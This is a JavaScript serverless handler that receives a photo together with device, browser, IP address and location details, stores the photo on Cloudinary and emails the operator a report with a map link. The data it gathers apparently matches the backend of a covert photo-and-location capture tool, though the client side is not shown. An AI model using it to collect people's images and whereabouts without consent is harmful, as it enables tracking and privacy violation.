import nodemailer from "nodemailer";
import cloudinary from "cloudinary";

// Allow large base64
export const config = {
  api: {
    bodyParser: { sizeLimit: "15mb" }
  }
};

// Cloudinary setup
cloudinary.v2.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

export default async function handler(req, res) {

  // CORS FIX
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  try {
    const { image, dateTime, deviceModel, browser, resolution, ip, ipLocation } = req.body;

    // Upload photo
    const uploadRes = await cloudinary.v2.uploader.upload(image || "", {
      folder: "user_photos"
    });

    const photoURL = uploadRes.secure_url;

    // EMAIL SETUP
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS
      }
    });

    const mapLink = `https://www.google.com/maps?q=${ipLocation}`;

    const htmlBody = `
      <h2>New Photo Uploaded</h2>

      <p><b>Date & Time:</b> ${dateTime}</p>
      <p><b>Device:</b> ${deviceModel}</p>
      <p><b>Browser:</b> ${browser}</p>
      <p><b>Resolution:</b> ${resolution}</p>
      <p><b>IP Address:</b> ${ip}</p>

      <p><b>Location:</b> 
        <a href="${mapLink}" target="_blank">Google Maps Link</a>
      </p>

      <br>

      <a href="${photoURL}" target="_blank"
         style="padding:10px 16px;background:#007bff;color:#fff;text-decoration:none;border-radius:6px;">
         View Uploaded Photo
      </a>

      <br><br>

      <img src="${photoURL}" width="280" style="border-radius:12px;">
    `;

    await transporter.sendMail({
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: "New Photo Uploaded ✔",
      html: htmlBody
    });

    return res.status(200).json({ success: true, url: photoURL });

  } catch (err) {
    console.error("ERROR:", err);
    return res.status(500).json({ error: err.message });
  }
}
